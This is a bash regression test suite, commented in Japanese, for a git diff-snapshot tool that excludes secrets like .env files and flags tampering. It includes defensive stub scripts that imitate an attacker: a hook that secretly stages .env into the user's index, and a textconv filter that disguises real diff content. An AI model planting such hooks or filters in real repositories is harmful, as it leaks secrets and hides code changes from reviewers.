#!/usr/bin/env bash
# diff-snapshot.sh の回帰テスト(scratch リポジトリだけを使う。外部 CLI 不要・ネットワーク不要)。
#
# 使い方:
#   bash diff-snapshot-selftest.sh            # 全ケース実行
#   bash diff-snapshot-selftest.sh -v         # 各ケースの出力も表示
#   DIFF_SNAPSHOT=<パス> bash diff-snapshot-selftest.sh   # 別の実装を対象にする(変異テスト用)
#
# 検証するのは「終了コードと出力の契約」「機密が漏れないこと」「改竄で実装内容を隠せないこと」
# 「ユーザーの index を書き換えないこと」「公開の原子性」。
# 期待終了コード: 0=生成 2=usage 4=no-base 20=internal 21=partial 22=改竄の疑い
#
# 前提: bash 4.0 以上(対象のスクリプトと同じく連想配列を使う)。git は PATH にあるもの。
#
# 終了コード: 0=全件 PASS / 1=FAIL あり
set -uo pipefail

SELF_PATH="${BASH_SOURCE[0]}"
case "$SELF_PATH" in /*) : ;; *) SELF_PATH="$PWD/$SELF_PATH" ;; esac
SCRIPT_DIR="$(dirname -- "$SELF_PATH")"
TARGET="${DIFF_SNAPSHOT:-$SCRIPT_DIR/diff-snapshot.sh}"
case "$TARGET" in /*) : ;; *) TARGET="$PWD/$TARGET" ;; esac
VERBOSE=0
[ "${1:-}" = "-v" ] && VERBOSE=1

[ -f "$TARGET" ] || { echo "ERROR: $TARGET が無い" >&2; exit 1; }

REAL_GIT="$(command -v git)"
[ -n "$REAL_GIT" ] || { echo "ERROR: git が無い" >&2; exit 1; }
REAL_MV="$(command -v mv)"
REAL_MKTEMP="$(command -v mktemp)"

WORK="$(mktemp -d)"
cleanup_work() {
  chmod -R u+rwX -- "$WORK" 2>/dev/null || true
  rm -rf -- "$WORK"
}
trap cleanup_work EXIT
mkdir -p "$WORK/bin"
cd "$WORK" || exit 1

# 隔離(ユーザーの設定を一切読ませない)。global 設定を要する 2 ケースだけ、その起動でだけ
# GIT_CONFIG_GLOBAL を scratch のファイルへ向ける
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_PAGER=cat
export LC_ALL=C
unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_CONFIG_COUNT 2>/dev/null || true
# git は core.excludesFile / 属性ファイルの既定値をホームと XDG の下から読むので、
# そこも scratch へ向けないと利用者の無視設定が scratch リポジトリに漏れる
export HOME="$WORK/home"
export XDG_CONFIG_HOME="$WORK/xdg"
mkdir -p "$HOME" "$XDG_CONFIG_HOME"

IS_ROOT=0
[ "$(id -u)" = 0 ] && IS_ROOT=1

PASS=0
FAIL=0
RESULTS=""
ok() { PASS=$((PASS + 1)); RESULTS="$RESULTS
PASS  $1"; }
ng() { FAIL=$((FAIL + 1)); RESULTS="$RESULTS
FAIL  $1"; }

# ── 汎用アサーション ──
ckt() { local d="$1"; shift; if "$@" >/dev/null 2>&1; then ok "$d"; else ng "$d"; fi; }
inf() { grep -qF -e "$2" -- "$1"; }    # $1=ファイル $2=部分文字列(先頭が - でも安全)
ing() { grep -q -e "$2" -- "$1"; }     # $1=ファイル $2=基本正規表現
ckf() { local d="$1"; shift; if "$@" >/dev/null 2>&1; then ng "$d"; else ok "$d"; fi; }
ckeq() { if [ "$2" = "$3" ]; then ok "$1"; else ng "$1(実際: $2 / 期待: $3)"; fi; }
ckne() { if [ "$2" != "$3" ]; then ok "$1"; else ng "$1(実際: $2)"; fi; }

# ── 対象の起動 ──
CASE_OUT="$WORK/case.out"
CASE_ERR="$WORK/case.err"
RC=0
GUARD_BIN=""
if command -v timeout >/dev/null 2>&1; then GUARD_BIN=timeout
elif command -v gtimeout >/dev/null 2>&1; then GUARD_BIN=gtimeout; fi
guard() { if [ -n "$GUARD_BIN" ]; then "$GUARD_BIN" -k 5 20 "$@"; else "$@"; fi; }
guard_t() { local t="$1"; shift; if [ -n "$GUARD_BIN" ]; then "$GUARD_BIN" -k 5 "$t" "$@"; else "$@"; fi; }

# 対象の stdin は既定で /dev/null にする。スイート自身の stdin(開いたままのパイプや端末)を
# 継がせると、`-` という名前のパスを引数で渡す退行版が FAIL ではなく待ち続けてしまう
run() { RC=0; bash "$TARGET" "$@" </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?; }
grun() { RC=0; guard bash "$TARGET" "$@" </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?; }
# stdin に内容を与えたいケース用(必ず外側 timeout で守る)
grun_in() { local src="$1"; shift; RC=0; guard bash "$TARGET" "$@" <"$src" >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?; }
show() { [ "$VERBOSE" -eq 1 ] || return 0; echo "--- stdout"; cat "$CASE_OUT"; echo "--- stderr"; cat "$CASE_ERR"; }

# ── scratch リポジトリ ──
GIT() { local d="$1"; shift; git -c user.email=t@t -c user.name=t -c init.defaultBranch=main -c protocol.file.allow=always -C "$d" "$@"; }
mkrepo() { # $1=$WORK 配下の名前
  local d="$WORK/$1"
  rm -rf -- "$d"
  mkdir -p -- "$d"
  git -c init.defaultBranch=main init -q -- "$d"
}
# 観測側の git も fsmonitor / フックを起動しない(退行検出が観測側の発火で汚れないため)
OGIT() { local d="$1"; shift; git -c core.fsmonitor= -c core.hooksPath=/dev/null -C "$d" "$@"; }

OUT="$WORK/out.md"
PATCHF="$WORK/out.patch"
reset_out() { rm -rf -- "$OUT" "$PATCHF"; }

# ── 出力の節を切り出す ──
SECF="$WORK/.sec"
HDF="$WORK/.hd"
secf() { awk -v h="## $2" 'BEGIN{p=0} $0==h{p=1;next} /^## /{if(p)exit} p{print}' "$1" >"$SECF"; }
sec_exists() { awk -v h="## $2" '$0==h{f=1} END{exit f?0:1}' "$1"; }
headf() { awk '/^## /{exit} {print}' "$1" >"$HDF"; }

# ── C 風引用の復号(git の core.quotePath と同じ規則)──
cunquote() { # $1=引用された 1 列目 → 復号して stdout(末尾に改行を付けない)
  local s="$1" out="" i ch oct
  case "$s" in '"'*) s="${s#\"}"; s="${s%\"}" ;; *) printf '%s' "$s"; return 0 ;; esac
  i=0
  while [ "$i" -lt "${#s}" ]; do
    ch="${s:i:1}"
    if [ "$ch" = '\' ]; then
      i=$((i + 1)); ch="${s:i:1}"
      case "$ch" in
        t) out="$out"$'\t' ;;
        n) out="$out"$'\n' ;;
        r) out="$out"$'\r' ;;
        a) out="$out"$'\a' ;;
        b) out="$out"$'\b' ;;
        v) out="$out"$'\v' ;;
        f) out="$out"$'\f' ;;
        '\') out="$out"'\' ;;
        '"') out="$out"'"' ;;
        [0-7]) printf -v oct '%b' "\\0${s:i:3}"; out="$out$oct"; i=$((i + 2)) ;;
        *) out="$out$ch" ;;
      esac
    else
      out="$out$ch"
    fi
    i=$((i + 1))
  done
  printf '%s' "$out"
}

# 節の行の 1 列目(タブ区切り)だけを取り出す
col1() { cut -f1 <"$SECF"; }

# ── よく使う小道具 ──
bigfile() { head -c "$2" /dev/zero | tr '\0' 'x' >"$1"; }   # $1=出力パス $2=バイト数
binfile() { printf 'head\000tail\n' >"$1"; }

# 一時ディレクトリの痕跡(公開用ディレクトリが残っていないこと)
no_pubdir() { # $1=探すディレクトリ
  local n
  n="$(find "$1" -maxdepth 2 -name '.diff-snapshot.*' -print 2>/dev/null | wc -l | tr -d ' ')"
  [ "$n" = 0 ]
}

# ── スタブ置き場 ──
STUBS="$WORK/stubs"
mkdir -p "$STUBS"

# 実行されたら痕跡ファイルを書く汎用スタブ(clean フィルタ・フック・fsmonitor に使う)
cat >"$STUBS/trace.sh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$SELFTEST_TRACE"
cat >/dev/null 2>&1 || true
exit 0
EOF
# clean フィルタとして使う痕跡スタブ(入力をそのまま返す = 差分は変わらない)
cat >"$STUBS/trace-clean.sh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "clean $*" >>"$SELFTEST_TRACE"
cat
EOF
# フック用: 痕跡を書き、さらに元リポジトリの index に .env を足す
cat >"$STUBS/hook-index.sh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "hook $*" >>"$SELFTEST_TRACE"
git -C "$SELFTEST_REPO" add .env >/dev/null 2>&1 || true
exit 0
EOF
chmod +x "$STUBS"/*.sh

# git-lfs スタブ(clean はポインタを返し、呼び出しを痕跡に記録する)
mkdir -p "$WORK/lfsbin"
cat >"$WORK/lfsbin/git-lfs" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "git-lfs $*" >>"${SELFTEST_LFS_TRACE:-/dev/null}"
case "${1:-}" in
  clean)
    tmp="$(mktemp)"
    cat >"$tmp"
    if head -n 1 "$tmp" | grep -q '^version https://git-lfs.github.com/spec/v1$'; then
      cat "$tmp"
    else
      oid="$(sha256sum <"$tmp" | cut -d' ' -f1)"
      sz="$(wc -c <"$tmp" | tr -d ' ')"
      printf 'version https://git-lfs.github.com/spec/v1\noid sha256:%s\nsize %s\n' "$oid" "$sz"
    fi
    rm -f "$tmp" ;;
  smudge) cat ;;
  version) echo "git-lfs/stub" ;;
  *) cat >/dev/null 2>&1 || true ;;
esac
exit 0
EOF
chmod +x "$WORK/lfsbin/git-lfs"
LFS_CLEAN='git-lfs clean -- %f'
LFS_SMUDGE='git-lfs smudge -- %f'

# PATH 先頭に置く git スタブ(特定のサブコマンドだけ失敗させ、他は本物へ委譲する)
mk_git_stub() { # $1=置き場 $2=判定の case 本体(真なら fail)$3=終了コード
  mkdir -p "$1"
  cat >"$1/git" <<EOF
#!/usr/bin/env bash
hit=0
$2
if [ "\$hit" -eq 1 ]; then exit $3; fi
exec "$REAL_GIT" "\$@"
EOF
  chmod +x "$1/git"
}

# PATH 先頭に置く mv スタブ(宛先で分岐する。本物への委譲と記録も行う)
mk_mv_stub() { # $1=置き場 $2=本体(bash。$dst に宛先が入る)
  mkdir -p "$1"
  cat >"$1/mv" <<EOF
#!/usr/bin/env bash
dst="\${@: -1}"
src="\${@: -2:1}"
printf '%s\t%s\n' "\$src" "\$dst" >>"\${SELFTEST_MV_LOG:-/dev/null}"
$2
exec "$REAL_MV" "\$@"
EOF
  chmod +x "$1/mv"
}

# realpath / readlink を持たないサンドボックス PATH
make_sandbox() { # $1=出力ディレクトリ 残り=除外するコマンド名
  local sb="$1" c x src skip
  shift
  mkdir -p "$sb"
  rm -f "$sb"/*
  for c in bash sh env git sed awk grep cat head tail tr wc cut sort uniq mktemp mv cp rm \
           mkdir rmdir dirname basename date find chmod ln touch ls printf sleep timeout \
           sha256sum shasum openssl python3 id stat du; do
    skip=0
    for x in "$@"; do [ "$c" = "$x" ] && skip=1; done
    [ "$skip" -eq 1 ] && continue
    src="$(command -v "$c" 2>/dev/null)" || continue
    [ -n "$src" ] && ln -sf "$src" "$sb/$c"
  done
}

# ── 追加の小道具 ──
mkvariant() { # $1=出力パス 残り=sed 式(対象の写しに順に当てる)
  local o="$1" e
  shift
  cp -- "$TARGET" "$o"
  for e in "$@"; do sed "$e" "$o" >"$o.w" && mv -- "$o.w" "$o"; done
}
runv() { local v="$1"; shift; RC=0; bash "$v" "$@" </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?; }

has_decoded() { # $1=節ファイル $2=期待するパス(C 風引用を復号して比較する)
  local c dec
  while IFS= read -r c; do
    dec="$(cunquote "$c")"
    [ "$dec" = "$2" ] && return 0
  done < <(cut -f1 <"$1")
  return 1
}

R=""
B=""
base_repo() { # $1=$WORK 配下の名前 → R と B を設定する
  mkrepo "$1"
  R="$WORK/$1"
  printf 'seed\n' >"$R/seed.txt"
  GIT "$R" add seed.txt
  GIT "$R" commit -q -m seed
  B="$(GIT "$R" rev-parse HEAD)"
}

# ── ① 新規ファイルのみ ──
base_repo c01
printf 'export const x = 1;\n' >"$R/new.ts"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "① 新規ファイルのみ: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "① 未追跡ファイル節に +++ b/new.ts" grep -qF '+++ b/new.ts' "$SECF"
ckt "① 未追跡ファイル節に内容行" grep -qF '+export const x = 1;' "$SECF"
show

# ── ② 途中 commit あり ──
base_repo c02
printf 'a1\n' >"$R/a.txt"
GIT "$R" add a.txt
GIT "$R" commit -q -m a
B="$(GIT "$R" rev-parse HEAD)"
printf 'b1\n' >"$R/b.txt"
GIT "$R" add b.txt
GIT "$R" commit -q -m mid
printf 'a2\n' >"$R/a.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "② 途中 commit あり: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "② 途中 commit の b.txt が追跡差分に出る" grep -qF '+++ b/b.txt' "$SECF"
ckt "② 作業ツリー変更の a.txt が追跡差分に出る" grep -qF '+a2' "$SECF"

# ── ②′ rename ──
base_repo c02b
printf 'oldbody\n' >"$R/old.txt"
GIT "$R" add old.txt
GIT "$R" commit -q -m old
B="$(GIT "$R" rev-parse HEAD)"
GIT "$R" mv old.txt newname.txt
GIT "$R" commit -q -m renamed
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "②′ rename: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "②′ old.txt の削除が出る" inf "$SECF" '--- a/old.txt'
ckt "②′ newname.txt の追加が出る" grep -qF '+++ b/newname.txt' "$SECF"

# ── ②″ 除外境界を跨ぐ rename ──
base_repo c02c
printf 'SECRET=old\n' >"$R/old.txt"
GIT "$R" add old.txt
GIT "$R" commit -q -m old
B="$(GIT "$R" rev-parse HEAD)"
GIT "$R" mv old.txt .env
printf 'SECRET=after\n' >>"$R/.env"
GIT "$R" add .env
GIT "$R" commit -q -m moved
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "②″ 除外境界を跨ぐ rename: exit 0" "$RC" 0
ckt "②″ old.txt の削除 hunk が出る" grep -qF -- '-SECRET=old' "$OUT"
ckf "②″ .env の追加が出ない" grep -qF '+++ b/.env' "$OUT"
ckf "②″ 追記後の値が出力全体に無い" grep -qF 'SECRET=after' "$OUT"

# ── ③ git add だけの変更 ──
base_repo c03
printf 'a1\n' >"$R/a.txt"
GIT "$R" add a.txt
GIT "$R" commit -q -m a
B="$(GIT "$R" rev-parse HEAD)"
printf 'a2staged\n' >"$R/a.txt"
GIT "$R" add a.txt
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "③ git add だけの変更: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "③ stage しただけの変更が追跡差分に出る" grep -qF '+a2staged' "$SECF"

# ── ④ 日本語ファイル名の新規ファイル ──
base_repo c04
printf 'にほんご\n' >"$R/新規ファイル.md"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "④ 日本語の新規ファイル: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "④ +++ b/新規ファイル.md がエスケープ無しで出る" grep -qF '+++ b/新規ファイル.md' "$SECF"

# ── ④′ 追跡済みの日本語ファイル名 ──
base_repo c04b
printf 'v1\n' >"$R/既存.md"
GIT "$R" add 既存.md
GIT "$R" commit -q -m ja
B="$(GIT "$R" rev-parse HEAD)"
printf 'v2\n' >"$R/既存.md"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "④′ 追跡済みの日本語名: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "④′ 追跡差分にエスケープ無しで出る" grep -qF '+++ b/既存.md' "$SECF"
secf "$OUT" "追跡差分(stat)"
ckt "④′ stat にエスケープ無しで出る" grep -qF '既存.md' "$SECF"

# ── ④″ textconv ──
base_repo c04c
printf '*.txt diff=fixed\n' >"$R/.gitattributes"
printf 'orig\n' >"$R/x.txt"
GIT "$R" add .gitattributes x.txt
GIT "$R" commit -q -m attr
B="$(GIT "$R" rev-parse HEAD)"
GIT "$R" config diff.fixed.textconv "sed 's/^/CONVERTED:/'"
printf 'real change\n' >"$R/x.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "④″(i) textconv: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "④″(i) diff.fixed.textconv が改竄の疑いに載る" grep -qF 'diff.fixed.textconv' "$SECF"
VAR_TEXTCONV="$WORK/var-textconv.sh"
mkvariant "$VAR_TEXTCONV" 's/|diff\.\*\.textconv//'
ckt "④″(ii) 変異版が bash -n を通る" bash -n "$VAR_TEXTCONV"
ckf "④″(ii) 設定検査から textconv の分岐が消えている" grep -qF 'diff.*.textconv' "$VAR_TEXTCONV"
reset_out
runv "$VAR_TEXTCONV" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "④″(ii) 設定検査を外した変異版: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "④″(ii) --no-textconv により実内容が出る" grep -qF '+real change' "$SECF"
ckf "④″(ii) CONVERTED: が出力全体に無い" grep -qF 'CONVERTED:' "$OUT"

# ── ④‴ submodule ──
mkrepo c04d_sub
SUBSRC="$WORK/c04d_sub"
printf 'SECRET=orig\n' >"$SUBSRC/.env"
printf 'code\n' >"$SUBSRC/lib.txt"
GIT "$SUBSRC" add .env lib.txt
GIT "$SUBSRC" commit -q -m s0
base_repo c04d
GIT "$R" submodule add -q -- "$SUBSRC" sub >/dev/null 2>&1
# サブモジュールを 2 個置く(gitlink の連想配列のキー展開が 2 件以上で壊れないこと)
mkrepo c04d_sub2
SUBSRC2="$WORK/c04d_sub2"
printf 'code2\n' >"$SUBSRC2/lib2.txt"
GIT "$SUBSRC2" add lib2.txt
GIT "$SUBSRC2" commit -q -m s0
R="$WORK/c04d"
GIT "$R" submodule add -q -- "$SUBSRC2" sub2 >/dev/null 2>&1
GIT "$R" commit -q -m addsub
GIT "$R" config diff.submodule diff
B="$(GIT "$R" rev-parse HEAD)"
# (小ケース)サブモジュール内のフィルタを実行しない — gitlink が HEAD と一致するうちに行う
SUBGITDIR="$R/.git/modules/sub"
GIT "$R/sub" config filter.t.clean "sh $STUBS/trace-clean.sh"
mkdir -p "$SUBGITDIR/info"
printf '* filter=t\n' >"$SUBGITDIR/info/attributes"
printf 'CODE\n' >"$R/sub/lib.txt"
export SELFTEST_TRACE="$WORK/tr04d"
: >"$SELFTEST_TRACE"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "④‴ サブモジュール内の未コミット変更: exit 0" "$RC" 0
ckeq "④‴ サブモジュール内の clean フィルタが実行されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
secf "$OUT" "追跡差分"
ckf "④‴ サブモジュールのパスが追跡差分に出ない" grep -qF 'diff --git a/sub b/sub' "$SECF"
rm -f "$SUBGITDIR/info/attributes"
GIT "$R/sub" config --unset filter.t.clean
printf 'code\n' >"$R/sub/lib.txt"
# サブモジュール側で commit すると gitlink の変更が出る
printf 'SECRET=x\n' >"$R/sub/.env"
GIT "$R/sub" add .env
GIT "$R/sub" commit -q -m s1
printf 'code2b\n' >"$R/sub2/lib2.txt"
GIT "$R/sub2" add lib2.txt
GIT "$R/sub2" commit -q -m s1b
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "④‴ gitlink の変更: exit 0" "$RC" 0
ckf "④‴ 出力全体に SECRET= が無い" grep -qF 'SECRET=' "$OUT"
ckf "④‴ パッチに SECRET= が無い" grep -qF 'SECRET=' "$PATCHF"
secf "$OUT" "追跡差分"
ckt "④‴ 追跡差分が Subproject commit 形" grep -qF 'Subproject commit' "$SECF"
ckeq "④‴ サブモジュール 2 個の gitlink が両方出る" "$(grep -c 'Subproject commit' "$SECF")" 4
ckt "④‴ sub の gitlink が出る" inf "$SECF" 'diff --git a/sub b/sub'
ckt "④‴ sub2 の gitlink が出る" inf "$SECF" 'diff --git a/sub2 b/sub2'
headf "$OUT"
ckt "④‴ NOTE サブモジュール配下の .git 名エントリ: 2 件" inf "$HDF" '配下の `.git` 名エントリ: 2 件'
for opt in diff.ignoreSubmodules submodule.sub.ignore; do
  GIT "$R" config "$opt" all
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
  ckeq "④‴ $opt=all でも exit 0" "$RC" 0
  secf "$OUT" "追跡差分(stat)"
  ckt "④‴ $opt=all で stat にサブモジュールのパスと変更件数の行が残る" ing "$SECF" '^ *sub *| *[0-9]'
  ckf "④‴ $opt=all の stat に Subproject commit 行は出ない" inf "$SECF" 'Subproject commit'
  secf "$OUT" "追跡差分"
  ckt "④‴ $opt=all で本文に Subproject commit が残る" grep -qF 'Subproject commit' "$SECF"
  ckt "④‴ $opt=all でパッチに Subproject commit が残る" grep -qF 'Subproject commit' "$PATCHF"
  ckf "④‴ $opt=all でも SECRET= が出ない" grep -qF 'SECRET=' "$OUT"
  GIT "$R" config --unset "$opt"
done
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
GIT "$R" worktree add -q --detach "$WORK/at04d" HEAD >/dev/null 2>&1
ckt "④‴ パッチが別ツリーで git apply --check を通る" env -u GIT_INDEX_FILE "$REAL_GIT" -C "$WORK/at04d" apply --check -- "$PATCHF"

# ── ⑤ 未追跡の機密ファイル ──
base_repo c05
printf 'SECRET=leak\n' >"$R/.env"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑤ 未追跡の .env: exit 0" "$RC" 0
ckf "⑤ 機密の値が出力全体に無い" grep -qF 'SECRET=' "$OUT"
secf "$OUT" "除外(機密)"
ckt "⑤ .env が除外(機密)に載る" grep -qF '.env' "$SECF"

# ── ⑤′ 改行・タブ・引用符を含む未追跡の名前 ──
base_repo c05b
mkdir -p "$R/secrets"
printf 'SECRET=x\n' >"$R/secrets/a"$'\n'"b.key"
printf 'AA\n' >"$R/a"
printf 'BB\n' >"$R/a"$'\t'"x"
printf 'CC\n' >"$R/\"q.txt"
printf 'DD\n' >"$R/a\"q.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" \
  --exclude-glob 'secrets/*.key' --max-untracked-bytes 0
ckeq "⑤′ 改行入りの機密名: exit 0" "$RC" 0
ckf "⑤′ 機密の値が出力全体(本文・stat)に無い" grep -qF 'SECRET=' "$OUT"
ckf "⑤′ 機密の値がパッチに無い" grep -qF 'SECRET=' "$PATCHF"
secf "$OUT" "除外(機密)"
ckt "⑤′ 改行入りの機密名が除外(機密)に載る" has_decoded "$SECF" "secrets/a"$'\n'"b.key"
secf "$OUT" "内容を省略した未追跡"
ckeq "⑤′ 1 列目が a と完全一致する行は 1 本だけ" "$(cut -f1 <"$SECF" | grep -c '^a$')" 1
ckt "⑤′ タブ入りパスの行は C 風引用で始まる" grep -q '^"a\\tx"	' "$SECF"
ckt "⑤′ 先頭が \" の名前が引用される" grep -qF '"\"q.txt"' "$SECF"
ckt "⑤′ 中に \" を含む名前が引用される" grep -qF '"a\"q.txt"' "$SECF"
ckt "⑤′ 引用を復号すると元の名前に戻る(タブ)" has_decoded "$SECF" "a"$'\t'"x"
ckt "⑤′ 引用を復号すると元の名前に戻る(先頭の引用符)" has_decoded "$SECF" '"q.txt'
ckt "⑤′ 引用を復号すると元の名前に戻る(途中の引用符)" has_decoded "$SECF" 'a"q.txt'

# ── ⑥ 追跡済みの機密ファイルの変更 ──
base_repo c06
printf 'SECRET=v1\n' >"$R/.env"
printf 'x1\n' >"$R/x.txt"
GIT "$R" add .env x.txt
GIT "$R" commit -q -m withenv
B="$(GIT "$R" rev-parse HEAD)"
printf 'SECRET=v2\n' >"$R/.env"
printf 'x2\n' >"$R/x.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑥ 追跡済みの .env の変更: exit 0" "$RC" 0
ckf "⑥ 機密の値が出力全体に無い" grep -qF 'SECRET=' "$OUT"
secf "$OUT" "追跡差分"
ckf "⑥ 追跡差分に .env が出ない" grep -qF 'a/.env' "$SECF"
secf "$OUT" "追跡差分(stat)"
ckf "⑥ stat に .env が出ない" grep -qF '.env' "$SECF"
secf "$OUT" "除外(機密)"
ckt "⑥ .env が除外(機密)に載る" grep -qF '.env' "$SECF"

# ── ⑥′ 追跡側の変更が機密 1 本だけ ──
base_repo c06b
printf 'SECRET=v1\n' >"$R/.env"
GIT "$R" add .env
GIT "$R" commit -q -m withenv
B="$(GIT "$R" rev-parse HEAD)"
printf 'SECRET=v2\n' >"$R/.env"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑥′ 除外後の pathspec が 0 件: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "⑥′ 追跡差分が(差分なし)" grep -qF '(差分なし)' "$SECF"
secf "$OUT" "追跡差分(stat)"
ckt "⑥′ stat が(差分なし)" grep -qF '(差分なし)' "$SECF"
ckf "⑥′ 機密の値が出力全体に無い" grep -qF 'SECRET=' "$OUT"

# ── ⑥″ グロブ文字を含む実在ファイル名 ──
base_repo c06c
printf 'g1\n' >"$R/a[1].txt"
printf 'SECRET=one\n' >"$R/a1.txt"
GIT "$R" add -- 'a[1].txt' 'a1.txt'
GIT "$R" commit -q -m globnames
B="$(GIT "$R" rev-parse HEAD)"
printf 'g2\n' >"$R/a[1].txt"
printf 'SECRET=two\n' >"$R/a1.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude '(^|/)a1\.txt$'
ckeq "⑥″ グロブ文字を含む名前: exit 0" "$RC" 0
ckf "⑥″ 除外対象 a1.txt の内容が出ない" grep -qF 'SECRET=' "$OUT"
secf "$OUT" "追跡差分"
ckt "⑥″ a[1].txt の変更は出る" grep -qF '+g2' "$SECF"

# ── ⑥‴ glob 変換 ──
base_repo c06d
mkdir -p "$R/deep/dir" "$R/secrets" "$R/x/secrets"
printf 'SECRET=root\n' >"$R/.env"
printf 'SECRET=deep\n' >"$R/deep/dir/.env"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '**/.env'
ckeq "⑥‴ **/.env: exit 0" "$RC" 0
ckf "⑥‴ **/.env でルート直下と深い階層の両方が除外される" grep -qF 'SECRET=' "$OUT"
secf "$OUT" "除外(機密)"
ckt "⑥‴ **/.env で deep/dir/.env が除外節に載る" grep -qF 'deep/dir/.env' "$SECF"
rm -f "$R/.env" "$R/deep/dir/.env"
printf 'SECRET=local\n' >"$R/.env.local"
printf 'ENVTXT\n' >"$R/env.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env.*'
ckeq "⑥‴ .env.*: exit 0" "$RC" 0
ckf "⑥‴ .env.* で .env.local が除外される" grep -qF 'SECRET=' "$OUT"
ckt "⑥‴ .env.* で env.txt は除外されない" grep -qF 'ENVTXT' "$OUT"
rm -f "$R/.env.local" "$R/env.txt"
printf 'SECRET=ROOTPEM\n' >"$R/secrets/key.pem"
printf 'SECRET=SUBPEM\n' >"$R/x/secrets/key.pem"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob 'secrets/[x]'
ckeq "⑥‴ ブラケットを含む glob: exit 2" "$RC" 2
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob 'secrets/'
ckeq "⑥‴ 末尾 / の glob: exit 0" "$RC" 0
ckf "⑥‴ 末尾 / で secrets/key.pem が除外される" grep -qF 'SECRET=ROOTPEM' "$OUT"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '/secrets'
ckeq "⑥‴ 先頭 / の glob: exit 0" "$RC" 0
ckf "⑥‴ 先頭 / でルート直下の secrets/key.pem が除外される" grep -qF 'SECRET=ROOTPEM' "$OUT"
ckt "⑥‴ 先頭 / で x/secrets/key.pem は除外されない" grep -qF 'SECRET=SUBPEM' "$OUT"
for g in 'secrets//' '//secrets'; do
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob "$g"
  ckeq "⑥‴ '$g' は exit 2" "$RC" 2
done
BADGLOBS=("a'b" 'a"b' $'a\nb' $'a\001b' 'a`b' 'a$b')
BADNAMES=("引用符(単)" "引用符(二重)" "改行" "制御文字" "バッククォート" "ドル記号")
for (( i = 0; i < ${#BADGLOBS[@]}; i++ )); do
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob "${BADGLOBS[$i]}"
  ckeq "⑥‴ ${BADNAMES[$i]} を含む glob は通常生成で exit 2" "$RC" 2
  run --print-exclude-ere --exclude-glob "${BADGLOBS[$i]}"
  ckeq "⑥‴ ${BADNAMES[$i]} を含む glob は --print-exclude-ere でも exit 2" "$RC" 2
done
run --print-exclude-ere --exclude-glob '.env'
ckeq "⑥‴ --print-exclude-ere: exit 0(リポジトリ不要)" "$RC" 0
ckt "⑥‴ --print-exclude-ere が結合 ERE を出す" grep -q '\.env' "$CASE_OUT"

# ── ⑥⁗ ファイル→ディレクトリ置換 ──
base_repo c06e
printf 'plainconfig\n' >"$R/config"
GIT "$R" add config
GIT "$R" commit -q -m cfg
B="$(GIT "$R" rev-parse HEAD)"
rm -f "$R/config"
mkdir -p "$R/config"
printf 'PUBLICOK\n' >"$R/config/public.txt"
printf 'SECRET=inconfig\n' >"$R/config/.env"
GIT "$R" add -A
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "⑥⁗ ファイル→ディレクトリ置換: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckf "⑥⁗ 本文に config/.env が出ない" grep -qF 'config/.env' "$SECF"
ckt "⑥⁗ 本文に config の削除が出る" inf "$SECF" '--- a/config'
ckt "⑥⁗ 本文に config/public.txt が出る" grep -qF 'PUBLICOK' "$SECF"
